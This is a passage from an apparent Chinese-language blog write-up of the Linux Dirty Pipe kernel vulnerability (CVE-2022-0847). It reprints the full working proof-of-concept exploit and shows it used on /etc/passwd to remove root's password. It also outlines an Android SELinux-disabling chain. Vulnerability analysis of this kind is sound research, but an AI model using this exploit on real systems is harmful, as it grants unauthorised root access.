class="line"></span><br><span class="line">			head = pipe-&gt;head;</span><br><span class="line">			··· ···</span><br><span class="line">			pipe-&gt;head = head + <span class="number">1</span>;</span><br><span class="line">			spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line"></span><br><span class="line">			<span class="comment">/* Insert it into the buffer array */</span></span><br><span class="line">			buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">			buf-&gt;page = page;<span class="comment">//[5]将新申请的页放到页数组中</span></span><br><span class="line">			buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">if</span> (is_packetized(filp))</span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_PACKET;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				buf-&gt;flags = PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line">            	<span class="comment">//[6]设置flag，默认PIPE_BUF_FLAG_CAN_MERGE</span></span><br><span class="line">			pipe-&gt;tmp_page = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">			copied = copy_page_from_iter(page, <span class="number">0</span>, PAGE_SIZE, from); </span><br><span class="line">            <span class="comment">//[7]拷贝操作</span></span><br><span class="line">			··· ···</span><br><span class="line">			ret += copied;</span><br><span class="line">			buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">			buf-&gt;len = copied;</span><br><span class="line"></span><br><span class="line">			··· ···</span><br><span class="line">		&#125;</span><br><span class="line">        ··· ···</span><br><span class="line">    &#125;</span><br><span class="line">	··· ···</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="splice系统调用"><a href="#splice系统调用" class="headerlink" title="splice系统调用"></a>splice系统调用</h3><p><strong>定义</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* splice() moves data between two file descriptors without copying </span></span><br><span class="line"><span class="comment"> * between kernel address space and user address space.  </span></span><br><span class="line"><span class="comment"> * It transfers up to len bytes of data from the file descriptor fd_in </span></span><br><span class="line"><span class="comment"> * to the file descriptor fd_out, where one of the file descriptors must refer to a pipe. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">splice</span><span class="params">(<span class="type">int</span> fd_in, <span class="type">off64_t</span> *off_in, <span class="type">int</span> fd_out,</span></span><br><span class="line"><span class="params">                      <span class="type">off64_t</span> *off_out, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br></pre></td></tr></table></figure>

<p><strong>作用</strong></p>
<p>拼接数据。</p>
<p><strong>调用栈如下</strong>：</p>
<ul>
<li><code>SYSCALL_DEFINE6(splice,...)</code> -&gt; <code>__do_sys_splice</code> -&gt; <code>__do_splice</code>-&gt; <code>do_splice</code><ul>
<li><code>splice_file_to_pipe</code> -&gt; <code>do_splice_to</code><ul>
<li><code>generic_file_splice_read</code>(<code>in-&gt;f_op-&gt;splice_read</code> 默认为 <code>generic_file_splice_read</code>)<ul>
<li><code>call_read_iter</code> -&gt; <code>filemap_read</code><ul>
<li><code>copy_page_to_iter</code> -&gt; <code>copy_page_to_iter_pipe</code></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><code>copy_page_to_iter_pipe</code>将<code>pipe</code> 缓存页结构指向要传输的文件的文件缓存页：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">copy_page_to_iter_pipe</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params">			 <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> i_head = i-&gt;head;</span><br><span class="line">	<span class="type">size_t</span> off;</span><br><span class="line"></span><br><span class="line">	··· ···</span><br><span class="line"></span><br><span class="line">	off = i-&gt;iov_offset;</span><br><span class="line">	buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<span class="comment">//[1]获取对应的pipe缓存页</span></span><br><span class="line">	··· ···</span><br><span class="line">	</span><br><span class="line">	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<span class="comment">//[2]修改pipe缓存页的相关信息指向文件缓存页</span></span><br><span class="line">	get_page(page);</span><br><span class="line">	buf-&gt;page = page;    <span class="comment">//[2]页指针指向了文件缓存页</span></span><br><span class="line">	buf-&gt;offset = offset;<span class="comment">//[2]offset len 等设置为当前信息(通过splice传入参数决定)</span></span><br><span class="line">	buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">	pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">	i-&gt;iov_offset = offset + bytes;</span><br><span class="line">	i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">	i-&gt;count -= bytes;</span><br><span class="line">	<span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：splice的零拷贝（是指不需要拷贝动作，来实现数据的传输），是将pipe的缓存页，变为页面缓存，方法是改变指针：</p>
<img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/image-20220309124515813.png" alt="image-20220309124515813" style="zoom:67%;" />

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="linux-内核page-cache机制"><a href="#linux-内核page-cache机制" class="headerlink" title="linux 内核page cache机制"></a>linux 内核page cache机制</h3><p>linux将打开的文件放到<strong>缓存页</strong>之中，缓存页被使用过后也会保存一段时间避免不必要的IO操作。短时间内访问同一个文件，都会操作相同的文件缓存页，而不是反复打开。</p>
<h2 id="漏洞起因"><a href="#漏洞起因" class="headerlink" title="漏洞起因"></a>漏洞起因</h2><p><code>PIPE_BUF_FLAG_CAN_MERGE</code>标志是在内核5.8中引入的，第一次<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/f6dd975583bd8ce088400648fd9819e4691c8958">commit</a> (f6dd975583bd8ce088400648fd9819e4691c8958)是在2020年5月，表示可以合并页面的管道中的数据，而无需重写内存中的数据。</p>
<p>但起因还要更早一些，在2016年的<a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b">commit</a> (241699cd72a8489c9446ae3910ddd243e9b9061b)中，引入了两个新的函数用于分配新的<code>struct pipe_buffer</code>，然而却忘了初始化其flags成员。结合<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志，就可以覆写页面缓存中的数据。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>利用限制：</p>
<ul>
<li>攻击者必须具有读取权限，因为需要将splice()页面放入管道。</li>
<li>偏移量不能在页面边界上，因为该页面的至少一个字节必须已拼接到管道中。</li>
<li>写入不能跨越页面边界，因为将为其余部分创建一个新的匿名管道。</li>
<li>文件无法调整大小，因为管道有自己的页面填充管理，并且不会告诉页面缓存附加了多少数据。</li>
</ul>
<p>利用步骤：</p>
<ol>
<li>以读取模式打开一个文件。</li>
<li>使用pipe()系统调用创建一个管道，此函数为允许写入和读取的描述符提供相同的进程访问权限。</li>
<li>将任意数据写入管道进行填充，将使用<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志初始化内存页面。</li>
<li>所有页面都标记了以后，就可以通过从管道中读取数据来释放它们。</li>
<li>当内核使用2016年引入的函数保存页面时，就不会初始化页面标志，则仍然为<code>PIPE_BUF_FLAG_CAN_MERGE</code>标志。</li>
<li>使用<code>splice()</code>函数加载开始时打开的文件，分配给这个文件的内存页将与我们的空管道相同。</li>
<li>直接覆盖管道中的数据。</li>
</ol>
<p>漏洞提交者给出的exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* SPDX-License-Identifier: GPL-2.0 */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright 2022 CM4all GmbH / IONOS SE</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Proof-of-concept exploit for the Dirty Pipe</span></span><br><span class="line"><span class="comment"> * vulnerability (CVE-2022-0847) caused by an uninitialized</span></span><br><span class="line"><span class="comment"> * &quot;pipe_buffer.flags&quot; variable.  It demonstrates how to overwrite any</span></span><br><span class="line"><span class="comment"> * file contents in the page cache, even if the file is not permitted</span></span><br><span class="line"><span class="comment"> * to be written, immutable or on a read-only mount.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This exploit requires Linux 5.8 or later; the code path was made</span></span><br><span class="line"><span class="comment"> * reachable by commit f6dd975583bd (&quot;pipe: merge</span></span><br><span class="line"><span class="comment"> * anon_pipe_buf*_ops&quot;).  The commit did not introduce the bug, it was</span></span><br><span class="line"><span class="comment"> * there before, it just provided an easy way to exploit it.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There are two major limitations of this exploit: the offset cannot</span></span><br><span class="line"><span class="comment"> * be on a page boundary (it needs to write one byte before the offset</span></span><br><span class="line"><span class="comment"> * to add a reference to this page to the pipe), and the write cannot</span></span><br><span class="line"><span class="comment"> * cross a page boundary.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Example: ./write_anything /root/.ssh/authorized_keys 1 $&#x27;\nssh-ed25519 AAA......\n&#x27;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Further explanation: https://dirtypipe.cm4all.com/</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGE_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create a pipe where all &quot;bufs&quot; on the pipe_inode_info ring have the</span></span><br><span class="line"><span class="comment"> * PIPE_BUF_FLAG_CAN_MERGE flag set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">prepare_pipe</span><span class="params">(<span class="type">int</span> p[<span class="number">2</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (pipe(p)) <span class="built_in">abort</span>();</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">unsigned</span> pipe_size = fcntl(p[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> buffer[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* fill the pipe completely; each pipe_buffer will now have</span></span><br><span class="line"><span class="comment">	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">		<span class="type">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">		write(p[<span class="number">1</span>], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* drain the pipe, freeing all pipe_buffer instances (but</span></span><br><span class="line"><span class="comment">	   leaving the flags initialized) */</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">unsigned</span> r = pipe_size; r &gt; <span class="number">0</span>;) &#123;</span><br><span class="line">		<span class="type">unsigned</span> n = r &gt; <span class="keyword">sizeof</span>(buffer) ? <span class="keyword">sizeof</span>(buffer) : r;</span><br><span class="line">		read(p[<span class="number">0</span>], buffer, n);</span><br><span class="line">		r -= n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* the pipe is now empty, and if somebody adds a new</span></span><br><span class="line"><span class="comment">	   pipe_buffer without initializing its &quot;flags&quot;, the buffer</span></span><br><span class="line"><span class="comment">	   will be mergeable */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Usage: %s TARGETFILE OFFSET DATA\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* dumb command-line argument parser */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> path = argv[<span class="number">1</span>];</span><br><span class="line">	<span class="type">loff_t</span> offset = strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *<span class="type">const</span> data = argv[<span class="number">3</span>];</span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> data_size = <span class="built_in">strlen</span>(data);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (offset % PAGE_SIZE == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot start writing at a page boundary\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="type">loff_t</span> next_page = (offset | (PAGE_SIZE - <span class="number">1</span>)) + <span class="number">1</span>;</span><br><span class="line">	<span class="type">const</span> <span class="type">loff_t</span> end_offset = offset + (<span class="type">loff_t</span>)data_size;</span><br><span class="line">	<span class="keyword">if</span> (end_offset &gt; next_page) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot write across a page boundary\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* open the input file and validate the specified offset */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span> fd = open(path, O_RDONLY); <span class="comment">// yes, read-only! :-)</span></span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;open failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">	<span class="keyword">if</span> (fstat(fd, &amp;st)) &#123;</span><br><span class="line">		perror(<span class="string">&quot;stat failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (offset &gt; st.st_size) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Offset is not inside the file\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (end_offset &gt; st.st_size) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Sorry, cannot enlarge the file\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create the pipe with all flags initialized with</span></span><br><span class="line"><span class="comment">	   PIPE_BUF_FLAG_CAN_MERGE */</span></span><br><span class="line">	<span class="type">int</span> p[<span class="number">2</span>];</span><br><span class="line">	prepare_pipe(p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* splice one byte from before the specified offset into the</span></span><br><span class="line"><span class="comment">	   pipe; this will add a reference to the page cache, but</span></span><br><span class="line"><span class="comment">	   since copy_page_to_iter_pipe() does not initialize the</span></span><br><span class="line"><span class="comment">	   &quot;flags&quot;, PIPE_BUF_FLAG_CAN_MERGE is still set */</span></span><br><span class="line">	--offset;</span><br><span class="line">	<span class="type">ssize_t</span> nbytes = splice(fd, &amp;offset, p[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (nbytes == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short splice\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* the following write will not create a new pipe_buffer, but</span></span><br><span class="line"><span class="comment">	   will instead write into the page cache, because of the</span></span><br><span class="line"><span class="comment">	   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">	nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line">	<span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ((<span class="type">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;It worked!\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>环境：<a target="_blank" rel="noopener" href="https://registry.hub.docker.com/r/chenaotian/cve-2022-0847">https://registry.hub.docker.com/r/chenaotian/cve-2022-0847</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -ti --<span class="built_in">rm</span> -h cvedebug --name cvedebug --cap-add=SYS_PTRACE chenaotian/cve-2022-0847:latest /bin/bash</span><br><span class="line">docker <span class="built_in">exec</span> -it cvedebug /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ~/cve-2022-0847</span><br><span class="line">gcc exp.c -o exp --static &amp;&amp; <span class="built_in">cp</span> exp ./rootfs &amp;&amp; <span class="built_in">cd</span> rootfs</span><br><span class="line">find . | cpio -o --format=newc &gt; ../rootfs.img</span><br><span class="line"><span class="built_in">cd</span> ../ </span><br><span class="line">./boot.sh</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux</span><br><span class="line">target remote :10086</span><br><span class="line">directory /root/linux-5.13</span><br><span class="line">b do_splice</span><br><span class="line">b copy_page_to_iter_pipe </span><br><span class="line">b pipe_write</span><br><span class="line">ignore 3 15</span><br><span class="line">c</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct pipe_inode_info *) pipe</span><br><span class="line">pwndbg&gt; p (struct pipe_buffer)pipe-&gt;bufs[0]</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  page = 0xffffea0000134cc0,</span><br><span class="line">  offset = 0,</span><br><span class="line">  len = 4096,</span><br><span class="line">  ops = 0xffffffff82019fc0 &lt;anon_pipe_buf_ops&gt;,</span><br><span class="line">  flags = 16,	==&gt; 标记</span><br><span class="line">  private = 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h2><p>编译上面的exp。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">head</span> -1 /etc/passwd <span class="comment"># 确认root受密码保护</span></span><br><span class="line"> root:x:0:0:root:/root:/usr/bin/zsh</span><br><span class="line">$ su                  <span class="comment"># 确认需要密码</span></span><br><span class="line">$ ./exp /etc/passwd 4 <span class="string">&#x27;::0:0:rootx&#x27;</span> <span class="comment"># 删除root密码保护</span></span><br><span class="line"> It worked!</span><br><span class="line">$ su                  <span class="comment"># 不需要输入密码</span></span><br></pre></td></tr></table></figure>

<h2 id="Android利用"><a href="#Android利用" class="headerlink" title="Android利用"></a>Android利用</h2><p><a target="_blank" rel="noopener" href="https://github.com/polygraphene/DirtyPipe-Android">DirtyPipe for Android</a>，这个漏洞利用复现有以下几个问题：</p>
<ul>
<li>需要编译内核源码，比较耗时间。</li>
<li>现有的pixel4 xl，Android12内核是4.14，没有到5.0以上。</li>
<li>没有pixel6的模拟器。</li>
</ul>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
<li>在 Android 上，没有 <code>/etc/passwd</code> 和 <code>suid</code>。此外，SELinux 监控系统上的每个操作。<ul>
<li>但是利用dirtypipe可以通过任何进程读取（和覆盖）系统库（<code>/system/lib/lib*.so</code>）。</li>
<li>init 进程加载许多系统库（动态链接）。</li>
<li>init 进程可以读取（和覆盖）比 app 进程更多的文件。</li>
<li>多次使用dirtypipe来加载定制的内核模块。</li>
</ul>
</li>
</ul>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul>
<li><p>该漏洞利用包括以下阶段：</p>
<ol>
<li>钩子初始化过程。</li>
<li>重写 <code>/vendor/bin/modprobe</code> 和供应商库。</li>
<li>fork() <code>/execve()</code> 进入 <code>/vendor/bin/modprobe</code>。</li>
<li>加载内核模块以禁用 selinux。</li>
</ol>
</li>
<li><p>阶段1</p>
<ol>
<li><p>覆盖init使用的<code>/system/lib64/libc++.so</code>。</p>
<ul>
<li><p>Hook函数<code>_ZNSt3__115basic_streambufIcNS_11char_traitsIcEEEC2Ev (std::__1::basic_streambuf&lt;char, std::__1::char_traits&lt;char&gt; &gt;::basic_streambuf())</code></p>
</li>
<li><p>通过运行命令<code>setprop</code>来触发该功能。</p>
</li>
</ul>
</li>
<li><p>发送下一阶段的有效载荷<code>/system/lib/libldacBT_enc.so</code>。</p>
<ul>
<li><p><code>libc++</code>空间有限。</p>
</li>
